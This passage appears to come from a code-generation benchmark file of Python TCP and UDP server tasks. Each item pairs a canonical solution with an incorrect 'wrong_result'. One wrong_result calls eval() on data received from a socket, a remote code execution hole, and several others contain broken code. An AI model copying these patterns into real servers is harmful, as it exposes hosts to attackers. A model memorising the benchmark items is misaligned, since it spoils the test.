       logging.info(f'listening on {host}:{port}')\n        server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socket\nimport threading\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nfrom threading import Lock\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n    dir_lock: Lock\n    param_lock: Lock\n    buffer_size: int\n    submission_id: int\n    mortal_param: OrderedDict\n    dqn_param: OrderedDict\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dir=buffer_dir,\n            drain_dir=drain_dir,\n            capacity=capacity,\n            force_sequential=force_sequential,\n            dir_lock=Lock(),\n            param_lock=Lock(),\n            buffer_size=0,\n            submission_id=0,\n            mortal_param=None,\n            dqn_param=None,\n            param_version=0,\n            idle_param_version=0\n        )\n\n    def start_server(self, host: str, port: int):\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.bind((host, port))\n        server_socket.listen(5)\n        print(f\"Parameter server started on {host}:{port}\")\n        while True:\n            client_socket, client_address = server_socket.accept()\n            threading.Thread(target=self.handle_client, args=(client_socket,)).start()\n\n    def handle_client(self, client_socket):\n        while True:\n            try:\n                data = client_socket.recv(1024)\n                if not data:\n                    break\n                msg = eval(data.decode())\n                if msg['type'] == 'get_param':\n                    self.handle_get_param(msg)\n                elif msg['type'] == 'submit_replay':\n                    self.handle_submit_replay(msg)\n                elif msg['type'] == 'submit_param':\n                    self.within_lock(self.param_lock, self.handle_submit_param, msg)\n                elif msg['type'] == 'drain':\n                    self.handle_drain()\n            except Exception as e:\n                print(f\"Error handling client: {e}\")\n                break\n        client_socket.close()\n\n    def handle_get_param(self, msg):\n        with self.state.dir_lock:\n            if self.state.mortal_param is not None:\n                self.state.param_version += 1\n                self.state.idle_param_version = self.state.param_version\n                msg['response'] = {'params': dict(self.state.mortal_param)}\n            else:\n                msg['response'] = {'error': 'No parameters available'}\n            client_socket.send(str(msg).encode())\n\n    def handle_submit_replay(self, msg):\n        with self.state.dir_lock:\n            self.state.submission_id += 1\n            file_path = f\"{self.state.buffer_dir}/replay_{self.state.submission_id}.bin\"\n            with open(file_path, 'wb') as f:\n                f.write(msg['data'])\n            msg['response'] = {'submission_id': self.state.submission_id}\n            client_socket.send(str(msg).encode())\n\n    def handle_submit_param(self, msg):\n        with self.state.dir_lock:\n            if self.state.force_sequential:\n                self.state.param_version += 1\n                self.state.idle_param_version = self.state.param_version\n            self.state.mortal_param = msg['params']\n            msg['response'] = {'version': self.state.param_version}\n            client_socket.send(str(msg).encode())\n\n    def handle_drain(self):\n        with self.state.dir_lock:\n            for filename in os.listdir(self.state.drain_dir):\n                file_path = os.path.join(self.state.drain_dir, filename)\n                if os.path.isfile(file_path):\n                    os.rename(file_path, os.path.join(self.state.buffer_dir, filename))\n            msg['response'] = {'drained': True}\n            client_socket.send(str(msg).encode())\n\n    def within_lock(self, lock, func, *args, **kwargs):\n        with lock:\n            func(*args, **kwargs)"
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a threaded TCP server in Python that handles client connections and messages, allowing for bidirectional communication while maintaining only one active client connection at a time.\n\nClass Description: MessageServer is a threaded TCP server that inherits from SocketServer.ThreadingTCPServer. It manages client connections, processes incoming messages, and provides methods for sending messages to the connected client. The server runs in a separate daemon thread and maintains state about the current client connection.\n\nAttributes:\n- server_thread: [Thread] - The thread in which the server runs\n- request_verified: [Event] - Event flag indicating whether a client connection has been verified\n- _client_socket: [socket] - The socket object of the currently connected client (None if no client is connected)\n- message_handled: [Event] - Event flag indicating when a message has been processed\n\nMethods:\n- __init__(server_address) -> [None] - Initializes the server with the given address and starts the server thread\n- send(message) -> [None] - Sends a message to the connected client if one exists\n- get_client_socket() -> [socket] - Returns the client socket after waiting for a connection to be verified\n- verify_request(request, client_address) -> [bool] - Verifies and accepts/rejects incoming connections (allows only one active connection)\n\nClass Description: MessageTCPHandler is a request handler class that inherits from SocketServer.BaseRequestHandler. It processes incoming messages from clients and manages the communication loop.\n\nAttributes: (inherits from BaseRequestHandler)\n- request: [socket] - The client connection socket\n- client_address: [tuple] - The client address\n- server: [MessageServer] - Reference to the server instance\n\nMethods:\n- handle() -> [None] - Main handler method that processes incoming messages in a loop, handles disconnections, and manages communication with the client",
    "Canonical_solution": "import threading\nimport logging\nimport sys\nimport socket\nimport unrealcv\nif (sys.version_info > (3, 0)):\n    import socketserver as SocketServer\nelse:\n    import SocketServer\n\nSocketServer.ThreadingMixIn.daemon_threads = True\nSocketServer.TCPServer.allow_reuse_address = True\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG)\nlogger.addHandler(logging.StreamHandler(sys.stdout))\n\nclass MessageTCPHandler(SocketServer.BaseRequestHandler):\n    def handle(self):\n        assert self.request != None\n\n        while True:\n            try:\n                logger.debug('Start to handle message')\n                self.server.message_handled.clear()\n                message = unrealcv.SocketMessage.ReceivePayload(self.request)\n\n                if message:\n                    unrealcv.SocketMessage.WrapAndSendPayload(self.request, message)\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Client release connection')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                    break\n            except Exception as e:\n                if e.errno == 10054:\n                    logger.debug('Remote connection is forcibly closed')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Unknown exception %s' % str(e))\n                    self.server.message_handled.set()\n\nclass MessageServer(SocketServer.ThreadingTCPServer):\n    def __init__(self, server_address):\n        super(MessageServer, self).__init__(server_address, MessageTCPHandler)\n        \n        def server_thread():\n            cur_thread = threading.current_thread()\n            logger.info('Started in thread %s' % cur_thread.name)\n            self.serve_forever()\n            logger.info(\"The server thread is stopped\")\n\n        self.server_thread = threading.Thread(target=server_thread)\n        self.server_thread.setDaemon(1)\n        self.server_thread.start()\n        \n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n\n    def send(self, message):\n        if self._client_socket:\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, message)\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        logger.debug('Return client socket')\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        logger.debug('Got a connection from %s' % str(client_address))\n        if self._client_socket:\n            logger.debug('Reject, only accept one connection')\n            accepted = False\n        else:\n            logger.debug('Accept, new connection')\n            self._client_socket = request\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, 'connected to Python Message Server')\n            accepted = True\n\n        self.request_verified.set()\n        return accepted",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socket\nimport threading\nfrom socketserver import ThreadingTCPServer, BaseRequestHandler\n\nclass MessageServer(ThreadingTCPServer):\n    def __init__(self, server_address):\n        self.server_thread = threading.Thread(target=self serve, daemon=True)\n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n        super().__init__(server_address, MessageTCPHandler)\n\n    def serve(self):\n        self.server_thread.start()\n        self.server_thread.join()\n\n    def send(self, message):\n        if self._client_socket:\n            self._client_socket.send(message.encode())\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        if self._client_socket is None:\n            self._client_socket = request\n            self.request_verified.set()\n            return True\n        return False\n\n\nclass MessageTCPHandler(BaseRequestHandler):\n    def handle(self):\n        self.server.message_handled.clear()\n        while True:\n            try:\n                data = self.request.recv(1024).decode()\n                if not data:\n                    break\n                self.server.send(f\"Received: {data}\")\n                self.server.message_handled.set()\n            except Exception as e:\n                break\n        self.server._client_socket = None\n        self.server.request_verified.clear()"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Implement a TCP server for clock synchronization that responds to client requests with the current time provided by a time function.\n\nClass Description: The system consists of three classes working together to create a threaded TCP server that handles time synchronization requests. The server responds to \"sync\" messages with the current timestamp.\n\nAttributes:\n\nserver: [Time_Echo_Server] - The TCP server instance handling client connections\nthread: [threading.Thread] - The thread running the server's serve_forever loop\n\nMethods:\n\n__init__: [Name](time_fn: callable) -> [None] - Initializes the clock synchronization server with a time-providing function\nstop: [Name]() -> [None] - Shuts down the server and joins the server thread\nport: [property]() -> [int] - Returns the port number the server is bound to (read-only)\nhost: [property]() -> [str] - Returns the host address the server is bound to (read-only)",
    "Canonical_solution": "import socket\nimport socketserver\nimport struct\nimport threading\nfrom functools import partial\n\nclass Time_Echo(socketserver.BaseRequestHandler):\n    def __init__(self, *args, time_fn, **kwargs):\n        self.time_fn = time_fn\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        while True:\n            data = self.request.recv(4)\n            if not data:\n                break\n            if data.decode(\"utf-8\") == \"sync\":\n                self.request.send(struct.pack(\"<d\", self.time_fn()))\n\nclass Time_Echo_Server(socketserver.ThreadingTCPServer):\n    def __init__(self, *, time_fn, host=\"\", **kwargs):\n        handler_class = partial(Time_Echo, time_fn=time_fn)\n        super().__init__((host, 0), handler_class, **kwargs)\n        self.allow_reuse_address = True\n\n    @property\n    def host(self) -> str:\n        return self.server_address[0]\n\n    @property\n    def port(self) -> int:\n        return self.server_address[1]\n\nclass Clock_Sync_Server:\n    def __init__(self, time_fn):\n        self.server = Time_Echo_Server(time_fn=time_fn)\n        self.thread = threading.Thread(target=self.server.serve_forever)\n        self.thread.start()\n\n    def stop(self):\n        self.server.shutdown()\n        self.thread.join()\n\n    @property\n    def port(self):\n        return self.server.port\n\n    @property\n    def host(self):\n        return self.server.host",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socket\nimport threading\nfrom datetime import datetime\n\nclass Time_Echo_Server:\n    def __init__(self, time_fn):\n        self.time_fn = time_fn\n        self.server = None\n        self.thread = None\n        self.host = 'localhost'\n        self.port = 12345\n\n    def start(self):\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server.bind((self.host, self.port))\n        self.server.listen(5)\n        self.thread = threading.Thread(target=self._serve_forever)\n        self.thread.start()\n\n    def _serve_forever(self):\n        while True:\n            client_socket, addr = self.server.accept()\n            print(f\"Connection from {addr}\")\n            data = client_socket.recv(1024).decode()\n            if data == \"sync\":\n                current_time = self.time_fn()\n                response = f\"{current_time}\\n\"\n                client_socket.sendall(response.encode())\n            client_socket.close()\n\n    def stop(self):\n        self.server.close()\n        self.thread.join()\n\n    @property\n    def port(self):\n        return self.server.getsockname()[1]\n\n    @property\n    def host(self):\n        return self.server.getsockname()[0]"
  },
  {
    "Task_id": 416,
    "Instruction": "Task Description: Implement a TCP server using Python's socketserver module to handle client connections and echo back received messages.\n\nClass Description: The solution consists of two classes: EchoHandler for processing client requests and TCPServerWrapper for managing the TCP server instance.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' for all interfaces)\n- port: int - The port number to listen on (default: 20000)\n- server: TCPServer - The TCP server instance created with specified host and port\n\nMethods:\n- EchoHandler.handle() -> None - Processes client requests by continuously receiving messages and echoing them back until connection is closed\n- TCPServerWrapper.__init__(host: str = '', port: int = 20000) -> None - Initializes the TCP server with given host and port\n- TCPServerWrapper.serve_forever() -> None - Starts the server and keeps it running indefinitely while printing status information",
    "Canonical_solution": "from socketserver import BaseRequestHandler, TCPServer\n\nclass EchoHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        while True:\n            msg = self.request.recv(8192)\n            if not msg:\n                break\n            self.request.send(msg)\n\nclass TCPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f'Echo server running on port {self.port}')\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "class EchoHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            self.request.sendall(data)\n\nclass TCPServerWrapper(socketserver.ThreadingTCPServer):\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        super().__init__((host, port), EchoHandler)\n\n    def serve_forever(self):\n        print(f\"Server started on {self.host}:{self.port}\")\n        super().serve_forever()"
  },
  {
    "Task_id": 417,
    "Instruction": "Task Description: Implement a TCP server in Python using the socketserver module to handle client requests, process data, and send responses back to the client.\n\nClass Description: The TCPServer class initializes and manages a TCP server that listens for client connections, processes incoming data, and sends appropriate responses. The EchoRequestHandler class handles individual client requests by processing received data and generating responses.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections.\n- server: socketserver.TCPServer - The instance of the TCP server that handles client connections.\n\nMethods:\n- __init__(port: int) -> None - Initializes the TCPServer instance with the specified port number.\n- start() -> None - Starts the TCP server, binds it to 'localhost' and the specified port, and begins listening for client connections indefinitely.\n- stop() -> None - Shuts down the TCP server if it is running.\n\nClass Description: The EchoRequestHandler class inherits from socketserver.BaseRequestHandler and defines how to handle incoming client requests.\n\nMethods:\n- handle() -> None - Processes the client's request by receiving data, decoding it, and performing actions based on the received data (either learning or classifying). It then sends a response back to the client. The method uses the following steps:\n  1. Receives data from the client using recv().\n  2. Decodes the data from UTF-8 format.\n  3. Parses the data to extract group and filename.\n  4. Depending on the presence of a filename, either performs a learning operation or a classification operation.\n  5. Encodes the result as JSON and sends it back to the client using send().",
    "Canonical_solution": "import json\nimport socketserver\nimport pickle\nimport numpy\nfrom random import shuffle\n\nclass EchoRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        data = self.request.recv(1024)\n        data = data.decode('utf-8').strip()\n        print(\"received data:'%s'\" % data)\n        group = data.split('=')[0].strip()\n        filename = data.split('=')[1].strip()\n        payload = \"error\".encode('utf-8')\n        if len(group) == 0:\n            self.request.send(payload)\n            return\n        randomF = RF()\n        if len(filename) == 0:\n            payload = json.dumps(randomF.learn(group, 0.9)).encode('utf-8')\n        else:\n            payload = json.dumps(\n                randomF.classify(\n                    group,\n                    filename +\n                    \".rftemp\")).encode('utf-8')\n        self.request.send(payload)\n        return\n\nclass TCPServer:\n    def __init__(self, port):\n        self.port = port\n        self.server = None\n\n    def start(self):\n        socketserver.TCPServer.allow_reuse_address = True\n        address = ('localhost', self.port)\n        self.server = socketserver.TCPServer(address, EchoRequestHandler)\n        self.server.serve_forever()\n\n    def stop(self):\n        if self.server:\n            self.server.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socketserver\nimport json\n\nclass TCPServer:\n    def __init__(self, port: int) -> None:\n        self.port = port\n        self.server = None\n\n    def start(self) -> None:\n        self.server = socketserver.TCPServer((\"localhost\", self.port), EchoRequestHandler)\n        self.server.serve_forever()\n\n    def stop(self) -> None:\n        if self.server:\n            self.server.shutdown()\n\n\nclass EchoRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self) -> None:\n        data = self.request.recv(1024).decode('utf-8')\n        try:\n            parsed_data = json.loads(data)\n            group = parsed_data.get('group')\n            filename = parsed_data.get('filename')\n\n            if filename:\n                # Perform classification operation\n                result = {\"status\": \"classified\", \"group\": group, \"filename\": filename}\n            else:\n                # Perform learning operation\n                result = {\"status\": \"learned\", \"group\": group}\n\n            self.request.sendall(json.dumps(result).encode('utf-8'))\n        except json.JSONDecodeError:\n            self.request.sendall(b\"Invalid JSON format\")"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a UDP-based relay class for HoloLens communication that handles both receiving data from HoloLens and forwarding it via ZeroMQ, as well as receiving commands from ZeroMQ and sending responses back to HoloLens.\n\nClass Description: Hololens_Relay is a class that establishes a bidirectional communication bridge between a HoloLens device (via UDP) and other processes (via ZeroMQ). It manages socket connections, message routing, and protocol handling for gaze data and calibration results.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for IPC communication\n- thread_pipe: [zmq.Socket] - Pipe for communicating with the worker thread\n- host: [str] - Host address for UDP binding\n- port: [str] - Port number for UDP binding\n- ipc_push_url: [str] - ZeroMQ URL for pushing messages\n- ipc_sub_url: [str] - ZeroMQ URL for subscribing to messages\n- gaze_receiver: [tuple] - Address of the current gaze data receiver\n- calib_result_receiver: [tuple] - Address of the current calibration result receiver\n\nMethods:\n- __init__(zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\") -> [None] - Initializes the relay with ZMQ context and connection URLs\n- start_server(new_address) -> [bool] - Binds the UDP socket to the specified address and starts the server\n- stop_server() -> [None] - Stops the server and cleans up resources\n- thread_loop(context, pipe) -> [None] - Main worker thread that handles message polling and routing (private method)\n- on_recv(socket, ipc_pub) -> [None] - Handles incoming UDP messages and generates appropriate responses (private method)",
    "Canonical_solution": "import socket\nimport zmq\nimport zmq_tools\nfrom pyre import zhelper\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = zhelper.zthread_fork(self.context, self.thread_loop)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.start_server(f\"{host}:{port}\")\n\n    def start_server(self, new_address):\n        self.thread_pipe.send_string(\"Bind\", flags=zmq.SNDMORE)\n        self.thread_pipe.send_string(new_address)\n        response = self.thread_pipe.recv_string()\n        msg = self.thread_pipe.recv_string()\n        if response == \"Bind OK\":\n            host, port = msg.split(\":\")\n            self.host = host\n            self.port = port\n            return True\n        return False\n\n    def stop_server(self):\n        self.thread_pipe.send_string(\"Exit\")\n        while self.thread_pipe:\n            pass\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        ipc_pub = zmq_tools.Msg_Dispatcher(context, self.ipc_push_url)\n        ipc_sub = zmq_tools.Msg_Receiver(\n            context,\n            self.ipc_sub_url,\n            (\"gaze\", \"notify.calibration.failed\", \"notify.calibration.successful\"),\n        )\n        poller.register(pipe, zmq.POLLIN)\n        poller.register(ipc_sub.socket, zmq.POLLIN)\n        remote_socket = None\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n\n        while True:\n            items = [sock for sock, _ in poller.poll()]\n            if pipe in items:\n                cmd = pipe.recv_string()\n                if cmd == \"Exit\":\n                    break\n                elif cmd == \"Bind\":\n                    new_url = pipe.recv_string()\n                    if remote_socket:\n                        poller.unregister(remote_socket)\n                        remote_socket.close()\n                    try:\n                        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                        remote_socket.setblocking(False)\n                        addr, port = new_url.split(\":\")\n                        socket_addr = (addr, int(port))\n                        remote_socket.bind(socket_addr)\n                    except OSError:\n                        remote_socket = None\n                        pipe.send_string(\"Error\", flags=zmq.SNDMORE)\n                        pipe.send_string(f\"Could not bind to Socket: {new_url}\")\n                    else:\n                        pipe.send_string(\"Bind OK\", flags=zmq.SNDMORE)\n                        pipe.send_string(new_url)\n                        poller.register(remote_socket, zmq.POLLIN)\n\n            if remote_socket and remote_socket.fileno() in items:\n                self.on_recv(remote_socket, ipc_pub)\n\n            if ipc_sub.socket in items:\n                while ipc_sub.new_data:\n                    topic, payload = ipc_sub.recv()\n                    if self.gaze_receiver and remote_socket and topic.startswith(\"gaze\"):\n                        method, eye = payload[\"topic\"].split(\".\")[1:3]\n                        if method == \"2d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"ff\", *payload[\"norm_pos\"]),\n                            )\n                        elif method == \"3d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"fff\", *payload[\"gaze_point_3d\"]),\n                            )\n                        remote_socket.sendto(data, self.gaze_receiver)\n\n                    elif (self.calib_result_receiver and remote_socket and \n                          topic.startswith(\"notify.calibration.\")):\n                        if payload[\"subject\"] == \"calibration.successful\":\n                            remote_socket.sendto(b\"ECS\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n                        elif payload[\"subject\"] == \"calibration.failed\":\n                            remote_socket.sendto(b\"ECF\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n\n        if remote_socket:\n            remote_socket.close()\n\n    def on_recv(self, socket, ipc_pub):\n        try:\n            byte_msg, sender = socket.recvfrom(2048)\n        except OSError:\n            return\n\n        if byte_msg[:1] == b\"R\":\n            try:\n                ipc_pub.socket.send_string(\"notify.calibration.add_ref_data\", flags=zmq.SNDMORE)\n                ipc_pub.socket.send(byte_msg[1:])\n                response = b\"0R\"\n            except Exception as e:\n                response = b\"FRReference point mal-formatted or missing: %s\" % str(e).encode()\n        elif byte_msg[:1] == b\"S\":\n            self.gaze_receiver = sender\n            response = b\"0S\"\n        elif byte_msg[:1] == b\"s\":\n            self.gaze_receiver = None\n            response = b\"0s\"\n        elif byte_msg[:1] == b\"I\":\n            mode = byte_msg[1:2]\n            init_2d = mode == b\"2\"\n            calib_method = \"HMD_Calibration\" if init_2d else \"HMD_Calibration_3D\"\n            ipc_pub.notify({\"subject\": \"start_plugin\", \"name\": calib_method})\n            response = b\"0I\"\n        elif byte_msg[:1] == b\"i\":\n            response = b\"0i\"\n        elif byte_msg[:1] == b\"C\":\n            self.calib_result_receiver = sender\n            response = b\"0C\"\n        elif byte_msg[:1] == b\"c\":\n            response = b\"0c\"\n        elif byte_msg[:1] == b\"T\":\n            try:\n                target = struct.unpack(\"f\", byte_msg[1:])[0]\n                response = b\"0T\"\n            except Exception:\n                response = b\"FT'%s' cannot be converted to float.\" % (byte_msg[1])\n        elif byte_msg[:1] == b\"V\":\n            response = b\"0V%s\" % bytes(__version__)\n        else:\n            response = b'FFUnknown command. \"%s\"' % byte_msg\n\n        socket.sendto(response, sender)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import zmq\nimport socket\nimport threading\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = self.context.socket(zmq.PUSH)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n        self.udp_socket = None\n\n    def start_server(self, new_address):\n        try:\n            self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            self.udp_socket.bind((self.host, int(self.port)))\n            self.gaze_receiver = new_address\n            return True\n        except Exception as e:\n            print(f\"Error starting UDP server: {e}\")\n            return False\n\n    def stop_server(self):\n        if self.udp_socket:\n            self.udp_socket.close()\n            self.udp_socket = None\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        poller.register(self.thread_pipe, zmq.POLLIN)\n        poller.register(self.udp_socket, zmq.POLLIN)\n\n        while True:\n            socks = dict(poller.poll())\n            if self.thread_pipe in socks and socks[self.thread_pipe] == zmq.POLLIN:\n                message = self.thread_pipe.recv()\n                if message == b'gaze':\n                    self.on_recv(self.udp_socket, self.context.socket(zmq.PUB))\n                elif message == b'calib':\n                    self.on_recv(self.udp_socket, self.context.socket(zmq.PUB))\n            if self.udp_socket in socks and socks[self.udp_socket] == zmq.POLLIN:\n                data, addr = self.udp_socket.recvfrom(1024)\n                if addr == self.gaze_receiver:\n                    self.context.socket(zmq.SUB).send(data)\n                elif addr == self.calib_result_receiver:\n                    self.context.socket(zmq.SUB).send(data)\n\n    def on_recv(self, socket, ipc_pub):\n        data = socket.recv(1024)\n        ipc_pub.send(data)"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Implement a UDP communication class that handles socket creation, data transmission, and reception with proper connection management and error handling.\n\nClass Description: The UDPCommunication class provides functionality for UDP-based network communication, including opening/closing connections, sending/receiving data, and managing connection status. It uses threading for asynchronous data reception and includes signal-based notification for connection status changes.\n\nAttributes:\n- conn: [socket.socket] - The UDP socket object used for communication\n- status: [ConnectionStatus] - Current connection status (CONNECTED/CLOSED)\n- config: [dict] - Configuration dictionary containing protocol, port, and target information\n- onConnectionStatus: [pyqtSignal] - Signal emitted when connection status changes\n- hintSignal: [pyqtSignal] - Signal for displaying error messages or hints\n- receiveProcess: [threading.Thread] - Thread handling incoming data reception\n\nMethods:\n- __init__() -> None - Initializes the UDP communication object with default configuration\n- openCloseSerial() -> None - Toggles connection state (opens if closed, closes if open)\n- receiveDataProcess(conn: socket.socket) -> None - Thread function for receiving data (private method)\n- send(data: bytes) -> None - Sends data to configured target\n- checkTarget(target: str) -> tuple - Validates and parses target address into (host, port) tuple\n- isConnected() -> bool - Returns current connection status\n- getConnStatus() -> ConnectionStatus - Returns current connection status object",
    "Canonical_solution": "from PyQt5.QtCore import pyqtSignal, QObject\nimport socket\nimport threading\nimport time\nimport re\n\nclass UDPCommunication:\n    def __init__(self):\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            \"protocol\": \"udp\",\n            \"port\": 2345,\n            \"target\": [\"127.0.0.1:2345\", [\"127.0.0.1:2345\"]]\n        }\n        self.onConnectionStatus = pyqtSignal(ConnectionStatus, str)\n        self.hintSignal = pyqtSignal(str, str, str)\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            try:\n                self.conn = socket.socket(type=socket.SOCK_DGRAM)\n                self.conn.bind((\"0.0.0.0\", self.config[\"port\"]))\n                self.status = ConnectionStatus.CONNECTED\n                self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n                self.receiveProcess.setDaemon(True)\n                self.receiveProcess.start()\n                self.onConnectionStatus.emit(self.status, \"\")\n            except Exception as e:\n                msg = _(\"Connect Failed\") + \"\\n\" + str(e)\n                self.hintSignal.emit(\"error\", _(\"Error\"), msg)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, msg)\n        else:\n            self.status = ConnectionStatus.CLOSED\n            if self.conn:\n                self.conn.close()\n                self.conn = None\n            self.onConnectionStatus.emit(self.status, \"\")\n\n    def receiveDataProcess(self, conn):\n        buffer = b''\n        t = 0\n        conn.settimeout(0.1)\n        while self.status != ConnectionStatus.CLOSED:\n            try:\n                data, target = conn.recvfrom(4096)\n                if data:\n                    if len(data) > 4096:\n                        flush = False\n                    t = time.time()\n                    buffer += data\n                    if buffer and (time.time() - t > 0.001):\n                        try:\n                            if buffer:\n                                self.onReceived(buffer)\n                        except Exception as e:\n                            print(\"-- error in onReceived callback:\", e)\n                        buffer = b''\n            except socket.timeout:\n                continue\n            except Exception as e:\n                print(\"-- recv error:\", e)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, _(\"Connection closed!\") + \" \" + str(e))\n                try:\n                    conn.close()\n                except Exception:\n                    pass\n                break\n\n    def send(self, data: bytes):\n        if self.conn and self.status == ConnectionStatus.CONNECTED:\n            target = self.checkTarget(self.config[\"target\"][0])\n            if not target:\n                self.hintSignal.emit(\"error\", _(\"Target error\"), _(\"Target error\") + \": \" + self.config[\"target\"])\n            self.conn.sendto(data, target)\n\n    def checkTarget(self, target):\n        if not target:\n            return None\n        host = target\n        port = 80\n        target = target.replace(\"\uff1a\", \":\")\n        if target.endswith(\":\"):\n            target = target[:-1]\n        _host = re.match('http(.*)://(.*)', target)\n        if _host:\n            s, target = _host.groups()\n            host = target\n        _host = re.match('(.*):(\\d*)', target)\n        if _host:\n            host, port = _host.groups()\n            port = int(port)\n        if host.endswith(\"/\"):\n            host = host[:-1]\n        return (host, port)\n\n    def isConnected(self):\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self):\n        return self.status",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport threading\nfrom enum import Enum\nfrom PyQt5.QtCore import pyqtSignal, QObject\n\nclass ConnectionStatus(Enum):\n    CONNECTED = 1\n    CLOSED = 2\n\nclass UDPCommunication(QObject):\n    onConnectionStatus = pyqtSignal(ConnectionStatus)\n    hintSignal = pyqtSignal(str)\n\n    def __init__(self):\n        super().__init__()\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            'protocol': 'udp',\n            'port': 5000,\n            'target': 'localhost'\n        }\n        self.receiveProcess = threading.Thread(target=self.receiveDataProcess, daemon=True)\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CONNECTED:\n            self.close()\n        else:\n            self.open()\n\n    def receiveDataProcess(self, conn):\n        while True:\n            try:\n                data, addr = conn.recvfrom(65535)\n                self.hintSignal.emit(f\"Received data from {addr}: {data.decode()}\")\n            except Exception as e:\n                self.hintSignal.emit(f\"Error receiving data: {str(e)}\")\n                break\n\n    def send(self, data: bytes) -> None:\n        if self.status != ConnectionStatus.CONNECTED:\n            self.hintSignal.emit(\"Not connected. Cannot send data.\")\n            return\n        try:\n            self.conn.sendto(data, self.checkTarget(self.config['target']))\n        except Exception as e:\n            self.hintSignal.emit(f\"Error sending data: {str(e)}\")\n\n    def checkTarget(self, target: str) -> tuple:\n        try:\n            host, port = target.split(':')\n            port = int(port)\n            return (host, port)\n        except ValueError:\n            self.hintSignal.emit(\"Invalid target format. Use 'host:port'.\")\n            return ('localhost', 5000)\n\n    def isConnected(self) -> bool:\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self) -> ConnectionStatus:\n        return self.status\n\n    def open(self):\n        if self.status == ConnectionStatus.CONNECTED:\n            return\n        self.status = ConnectionStatus.CONNECTED\n        self.onConnectionStatus.emit(self.status)\n        self.conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.receiveProcess.start()\n\n    def close(self):\n        if self.status == ConnectionStatus.CLOSED:\n            return\n        self.status = ConnectionStatus.CLOSED\n        